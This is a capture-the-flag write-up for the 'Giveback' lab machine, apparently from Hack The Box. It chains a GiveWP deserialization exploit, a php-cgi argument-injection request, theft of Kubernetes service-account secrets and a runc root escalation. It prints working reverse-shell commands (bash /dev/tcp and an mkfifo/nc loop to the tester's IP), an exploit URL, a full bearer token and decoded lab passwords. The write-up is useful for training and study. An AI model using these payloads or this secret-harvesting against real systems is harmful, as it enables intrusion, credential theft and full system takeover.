# Giveback

**Target IP:** `10.129.242.171`  
**Hostname:** `giveback.htb`  
**Platform:** `Linux`  
**Difficulty:** `Medium`

---

## 1. Enumeration

### Port Scan

```
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
```

Another classic ssh + http combo. Typically http servers are the vulnerable component here so we will start our recon here.

### Web Reconnaissance

Viewing the site, it appears to be a page built for donations, with the additional capability blog posts. By inspecting the footer we can see it is powered by Wordpress.
![](Screenshots/Pasted%20image%2020260220114108.png)

Viewing the only blog post available we can see some mention to "NFP" and some mention of using "new technologies" and "move into EKS". We can also see this post is made by user babywyrm who appears to be the admin. EKS likely refers to Amazon Elastic Kubernetes Service. NFP likely stands for not for profit and is not useful for our recon.
![](Screenshots/Pasted%20image%2020260220114347.png)

Directory fuzzing:

```bash
feroxbuster --url http://giveback.htb/
```

However, we got a lot of 503 errors which are not useful and so we filter this to see the proper results.
```bash
feroxbuster --url http://giveback.htb/ -C 503
```

This finds a lot of files and folders typical to wordpress, with nothing obviously out of the ordinary. There is of course the wordpress login at /wp-admin and we see xmlrpc is disabled.
![](Screenshots/Pasted%20image%2020260220114903.png)

Subdomain / vhost enumeration:

```bash
ffuf -c -u http://10.129.242.171 -H "Host: FUZZ.giveback.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -fc 301
```

No additional subdomains were found.

### Additional Enumeration - WPScan

As this is a wordpress site it is very important to perform additional enumeration to determine any outdated plugins or versions as this is very common in wordpress sites.

```bash
wpscan --url http://giveback.htb
```
![](Screenshots/Pasted%20image%2020260220120515.png)

The only thing flagged is a heavily out of date plugin (Give) which it has identified as being v3.14.0:
![](Screenshots/Pasted%20image%2020260220120629.png)

---

## 2. Initial Foothold — CVE-2024-8353

Based on the WPScan we found that the GiveWP is outdated. Searching this version number online we found it is potentially vulnerable to CVE-2024-5932 and CVE-2024-8353. Both CVEs exploit deserialization of user input from the give_title parameter, allowing attackers to inject a PHP object and execute code remotely. Both effects all versions of GiveWP up to and including 3.14.1. 

**POC CVE-2024-5932:** https://github.com/EQSTLab/CVE-2024-5932
**POC CVE-2024-8353:** https://github.com/EQSTLab/CVE-2024-8353

### Exploitation

This exploit requires a URL pointing to the specific donation form URL. Clicking around on the site we find this at `http://giveback.htb/donations/the-things-we-need/`
![](Screenshots/Pasted%20image%2020260220120848.png)

Confirm RCE / initial access using CVE-2024-5932:

```bash
python3 CVE-2024-5932-rce.py -u http://giveback.htb/donations/the-things-we-need/ -c 'whoami'
```
![](Screenshots/Pasted%20image%2020260220121547.png)
This returns nothing, signifying it hasn't ran successfully. I tried also with a curl to my local server, but neither worked.

Moving on to test CVE-2024-8353, with a simple check:

```bash
python3 CVE-2024-8353.py -u http://giveback.htb/donations/the-things-we-need/ -c 'whoami'
```
![](Screenshots/Pasted%20image%2020260220122034.png)

This time we get prompted for an ID (it is suggested to give 17 so we do that.) But still no data is returned. I try a curl command to my local server instead.

```bash
python3 CVE-2024-8353.py -u http://giveback.htb/donations/the-things-we-need/ -c 'curl 10.10.14.49'
```

Unfortunately this also doesn't work and we get no results.

Going back to the drawing board a bit I think about how the exploit is formed and how it is within the context of php. Therefore to execute commands we likely need to specify to use bash (e.g. `bash -c 'COMMAND'`). It is also possible that curl is not available on the host, so lets confirm by testing with an RCE payload, using netcat as a listener:
```bash
python3 CVE-2024-8353.py -u http://giveback.htb/donations/the-things-we-need/ -c 'bash -c "bash -i >& /dev/tcp/10.10.14.49/4444 0>&1"'
```

Running this we get a shell as 6dcd5c8b7d-rpkfs
![](Screenshots/Pasted%20image%2020260220141545.png)

We can also see why the curl and whoami commands weren't working, as the terminal seems to be very limited and doesn't have this functionality. 

*Sidenote CVE-2024-5932 also works with this payload and gets a shell*

---

## 3. Post foothold enumeration

Now we have a shell we can begin looking around. The functionality is very limited, with very few tools installed. There are also no users aside from root listed in /etc/passwd.
![](Screenshots/Pasted%20image%2020260220142028.png)

I have a suspicion at this point we may be in some form of container.

Looking at the environment variables we see some interesting entries. 
![](Screenshots/Pasted%20image%2020260220143032.png)
Firstly, there seems to be some "legacy" service running on port 5000 and Kubernetes running on port 443. This all aligns with what we found in the blog post earlier and may be our way forward. At this stage I suspect the legacy pages may contain some vulnerability that will allow us to break out of this container, however to interact with it we will need to perform some form of port forwarding.
### Port forwarding

To port forward, I chose to use chisel (https://github.com/jpillora/chisel) as it is incredibly easy to use, however something like ligolo may be more useful for longer engagements.

There was initially some issue finding a tool that could be used to upload files to the container, however, eventually I found php was installed on the server and files could be transferred like so:
```bash
php -r '$url="http://10.10.14.49:80/chisel"; $out="/tmp/chisel"; file_put_contents($out, file_get_contents($url)) or exit(1); echo "saved to $out\n";'
```

Now we can use the binary to chisel.

On my local machine:
```bash
chisel server -reverse -p 8081 --socks5 -v
```

On the container:
```bash
chmod +x /tmp/chisel
/tmp/chisel client 10.10.14.49:8081 R:9050:socks
```

And we get connected. Now I just need to edit /etc/proxychains4.conf to make sure it uses port 9050 and socks5 (at the bottom of the file.)
![](Screenshots/Pasted%20image%2020260220144128.png)

I can now use this by prefixing any command with `proxychains4`.

---

## 4. Container Breakout

### Validation of legacy service
Using proxychains4 and the knowledge of our internal service running on port 5000, I attempt to curl this.
```bash
proxychains4 curl giveback.htb:5000
```
![](Screenshots/Pasted%20image%2020260220144401.png)

Going back to the env file I see an entry specifying the whole address, including a different IP address.
![](Screenshots/Pasted%20image%2020260220144502.png)

Curling this we can see data is returned and we can see an internal webpage running:
```bash
proxychains4 curl 10.43.2.241:5000
```
![](Screenshots/Pasted%20image%2020260220144601.png)

### Enumeration of legacy service

In the response to the curl request we see an interesting line towards the bottom:
```
<p>This CMS was originally deployed on Windows IIS using <code>php-cgi.exe</code>.
    During migration to Linux, the Windows-style CGI handling was retained to ensure
    legacy scripts continued to function without modification.</p>
```

and 
```
**SRE** - This system still includes legacy CGI support. Cluster misconfiguration may likely expose internal scripts.
```

This seems to be hinting at some form of php-cgi style exploit, which there are many of, but with the variation that is was originally built on windows and has .exe now instead.

### CVE-2024-4577

We can verify php-cgi is available by curling the endpoint:
```bash
proxychains4 curl 10.43.2.241:5000/cgi-bin/php-cgi
```

This returns `OK` signifying it is enabled and exists. Based on this we can likely exploit CVE-2024-4577.

There are many POCs for this exploit but it seems relatively trivial to exploit manually. The exploit works by sending a POST request to a specific endpoint. Due to improper character encoding, the web server forwards the request to the PHP server, where it is processed as an argument and executes commands. I used the following as reference - https://www.keysight.com/blogs/en/tech/nwvs/2024/07/29/cve-2024-4577-php-cgi-os-command-injection-vulnerability.

We can test this works by doing:
```bash
proxychains4 curl -X POST "http://10.43.2.241:5000/cgi-bin/php-cgi?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input" -d 'curl 10.10.14.49:4445'
```

This gets a callback:
![](Screenshots/Pasted%20image%2020260220150623.png)

Now we can use the same exploit to gain a shell and breakout of the container. I use penelope framework (github.com/brightio/penelope) as a listener for a better shell.

Payload: 
```bash
proxychains4 curl -X POST "http://10.43.2.241:5000/cgi-bin/php-cgi?-d+allow_url_include+-d+auto_prepend_file=php://input" -d 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.49 4444 >/tmp/f'
```

This pops a shell, seemingly running as root, but still looking like it might be within a container as no flag is found.
![](Screenshots/Pasted%20image%2020260220150946.png)

---

## 5. Kubernetes

### Box exploration

We have a shell now running as root, however it still appears to be within a container. The environment variables are set very similarly to in the other box. Remembering earlier we had some reference to kubernetes and there is mention to this in the environment variables, I suspect this is the way forward.

Searching around on the host I find an interesting folder at `/run/secrets/kubernetes.io/serviceaccount`

Here there are some interesting files
Token:
```
eyJhbGciOiJSUzI1NiIsImtpZCI6Inp3THEyYUhkb19sV3VBcGFfdTBQa1c1S041TkNiRXpYRS11S0JqMlJYWjAifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiLCJrM3MiXSwiZXhwIjoxODAzMTM1MjAxLCJpYXQiOjE3NzE1OTkyMDEsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwianRpIjoiYWJlN2U4ZDktY2ViNC00YTIwLTgzNjAtZDFlYmVkZGE2MjlkIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0Iiwibm9kZSI6eyJuYW1lIjoiZ2l2ZWJhY2suaHRiIiwidWlkIjoiMTJhOGE5Y2YtYzM1Yi00MWYzLWIzNWEtNDJjMjYyZTQzMDQ2In0sInBvZCI6eyJuYW1lIjoibGVnYWN5LWludHJhbmV0LWNtcy02ZjdiZjVkYjg0LWI0ejhkIiwidWlkIjoiMDFlODRkZDMtY2ZiYS00ZTdkLThjZTEtYmFkMDM1ODE0ZjgzIn0sInNlcnZpY2VhY2NvdW50Ijp7Im5hbWUiOiJzZWNyZXQtcmVhZGVyLXNhIiwidWlkIjoiNzJjM2YwYTUtOWIwOC00MzhhLWEzMDctYjYwODc0NjM1YTlhIn0sIndhcm5hZnRlciI6MTc3MTYwMjgwOH0sIm5iZiI6MTc3MTU5OTIwMSwic3ViIjoic3lzdGVtOnNlcnZpY2VhY2NvdW50OmRlZmF1bHQ6c2VjcmV0LXJlYWRlci1zYSJ9.HCLs8PDc35YC777PQF2pnKvPb21w6VX0L_ESDVBCAKHqbQ3aap9AkAG8HkTGQQkW177_OJMn1ZhCcO1ZDR2rSQrzRiKJ6aqjcSwEwkeeQow7F8UJfKvq08MaZGRrqQCR2hPVURLzawzw7Z6ffcPbzmBuPwShBjjBwSop9ZoGJC8CdMuMCBceQmTimuZVur9TkYXwUwwQEwzRtTTRjKJD1REAdY6MNh8Ogqzdz0OpSSYc1f9QL4QbfXaoT2Hcwq-PJkQVC4wHV2qKEBZWUkYbXpBkTTEj1gJcBbKUhmGDSqCy_2zDschhf7EWiP3K9ciXHaZcLGsCQIBCQ1ByfSVuUA
```

namespace:
```
default
```

With this token we can likely enumerate the kubernetes service.

### Kubernetes enumeration

Using the techniques listed at https://cloud.hacktricks.wiki/en/pentesting-cloud/kubernetes-security/kubernetes-enumeration.html I start enumerating the kubernetes service.

Set up some variables and an alias to perform enumeration easier:
```bash
export APISERVER=${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT_HTTPS}
export SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount
export NAMESPACE=$(cat ${SERVICEACCOUNT}/namespace)
export TOKEN=$(cat ${SERVICEACCOUNT}/token)
export CACERT=${SERVICEACCOUNT}/ca.crt
alias kurl="curl --cacert ${CACERT} --header \"Authorization: Bearer ${TOKEN}\""
```

Get all secrets:
```bash
kurl -v https://$APISERVER/api/v1/namespaces/default/secrets/
```

This gets some interesting secrets such as a secret named **user-secret-babywyrm**:
![](Screenshots/Pasted%20image%2020260220152050.png)

This displays a value **MASTERPASS** of `Qzg1WEM4VW5HckpkbEtnNEpoTWp0czVhRzh5MzhNZTM=` which appears to be base64 encoded. This decodes to `C85XC8UnGrJdlKg4JhMjts5aG8y38Me3`

I try this for ssh, using the username we found earlier in the blog post (babywyrm) and it works:
```bash
ssh babywyrm@giveback.htb 
```

We can then get the user flag:
![](Screenshots/Pasted%20image%2020260220152400.png)
## 6. Priv Esc

### Enumeration
Starting with the low hanging fruit, I search to see if we can run any commands as sudo.

```python
sudo -l
```
![](Screenshots/Pasted%20image%2020260220152521.png)

This shows some interesting tool at /opt/debug which we can run as sudo.

When running this it requests an administrative password:
![](Screenshots/Pasted%20image%2020260220152627.png)

At this point I tried many many passwords and nothing seemingly stuck. Eventually I went back through my notes and found in the kubernetes secret there was another entry at the top listed as **mariadb-password**:
![](Screenshots/Pasted%20image%2020260220153112.png)

These again look base64 encoded. Decoding the first one gives `sW5sp4spa3u7RLyetrekE4oS`. Testing this as the admin password, it works:
![](Screenshots/Pasted%20image%2020260220153201.png)

### Exploitation
Adding the help flag we see it seems to be a "Restricted runc debug wrapper":
![](Screenshots/Pasted%20image%2020260220153330.png)

Runc is a linux tool used for spawning and running containers. As we can run this as sudo, we can exploit it using the steps listed at - https://blog.1nf1n1ty.team/hacktricks/linux-hardening/privilege-escalation/runc-privilege-escalation.

First create a config.json file
```bash
sudo /opt/debug spec
```

Inside the mounts section add the following:
```
{
    "type": "bind",
    "source": "/",
    "destination": "/",
    "options": [
        "rbind",
        "rw",
        "rprivate"
    ]
},
```


Now make a folder called rootfs
```bash
mkdir rootfs
```

Now we can execute this by running:
```bash
sudo /opt/debug run rootfs
```

This works and we mount the root / folder and can read root.txt:
![](Screenshots/Pasted%20image%2020260220161934.png)

## 7. Bonus! - Post patch exploit

It appears that this method was slightly unintentional, and was later patched by the box owner. Now when you run the commands as above you get the following:
![](Screenshots/Pasted%20image%2020260220155424.png)

With this patch, we now need to manually specify the command to be ran and the arguments in order to read the root.txt file:
```json
{
            "ociVersion": "1.0.2-dev",
            "process": {
                "terminal": false,
                "user": {"uid": 0, "gid": 0},
                "args": ["/bin/cat", "/proc/1/root/root/root.txt"],
                "env": ["PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", "TERM=xterm"],
                "cwd": "/",
                "capabilities": {
                    "bounding": ["CAP_SYS_ADMIN", "CAP_DAC_OVERRIDE", "CAP_AUDIT_WRITE", "CAP_KILL", "CAP_NET_BIND_SERVICE", "CAP_SYS_PTRACE", "CAP_SYSLOG"],
                    "effective": ["CAP_SYS_ADMIN", "CAP_DAC_OVERRIDE", "CAP_AUDIT_WRITE", "CAP_KILL", "CAP_NET_BIND_SERVICE", "CAP_SYS_PTRACE", "CAP_SYSLOG"],
                    "inheritable": ["CAP_SYS_ADMIN", "CAP_DAC_OVERRIDE", "CAP_AUDIT_WRITE", "CAP_KILL", "CAP_NET_BIND_SERVICE", "CAP_SYS_PTRACE", "CAP_SYSLOG"],
                    "permitted": ["CAP_SYS_ADMIN", "CAP_DAC_OVERRIDE", "CAP_AUDIT_WRITE", "CAP_KILL", "CAP_NET_BIND_SERVICE", "CAP_SYS_PTRACE", "CAP_SYSLOG"],
                    "ambient": ["CAP_SYS_ADMIN", "CAP_DAC_OVERRIDE", "CAP_AUDIT_WRITE", "CAP_KILL", "CAP_NET_BIND_SERVICE", "CAP_SYS_PTRACE", "CAP_SYSLOG"]
                },
                "rlimits": [{"type": "RLIMIT_NOFILE", "hard": 1024, "soft": 1024}],
                "noNewPrivileges": false,
                "apparmorProfile": ""
            },
            "root": {
                "path": "rootfs",
                "readonly": true
            },
            "mounts": [
                {"destination": "/proc", "type": "proc", "source": "proc", "options": ["nosuid", "noexec", "nodev"]},
                {"destination": "/dev", "type": "tmpfs", "source": "tmpfs", "options": ["nosuid", "strictatime", "mode=755", "size=65536k"]}
            ],
            "linux": {
                "namespaces": [
                    {"type": "mount"},
                    {"type": "network"}
                ],
                "maskedPaths": [],
                "readonlyPaths": []
            }
        }
```

Then we will need to build up a fake filesystem in rootfs with all the binaries needed (i.e. /bin/sh) and all the lib files needed.

```bash
mkdir rootfs
cd rootfs
mkdir bin
mkdir lib
mkdir lib64
cp /bin/cat ./bin/cat
cp -r /lib/x86_64-linux-gnu ./lib
cp -r /lib64/ld-linux-x86-64.so.2 ./lib64
```

Then we can execute:
```bash
sudo /opt/debug run rootfs
```
![](Screenshots/Pasted%20image%2020260220165311.png)

Giving the root flag. 

**NOTE**: You can change the command to gain a reverse shell if required by altering the args in the JSON file.

---

## Summary

| Step                   | Technique                                                  |
| ---------------------- | ---------------------------------------------------------- |
| Initial access         | CVE-2024-8353 - GiveWP Plugin exploit                      |
| Container Breakout     | CVE-2024-4577 - PHP-CGI exploit on internal legacy website |
| Kubernetes Enumeration | Enumerating secrets to gain user credentials               |
| Privilege escalation   | Escalating to root user via runc binary                    |
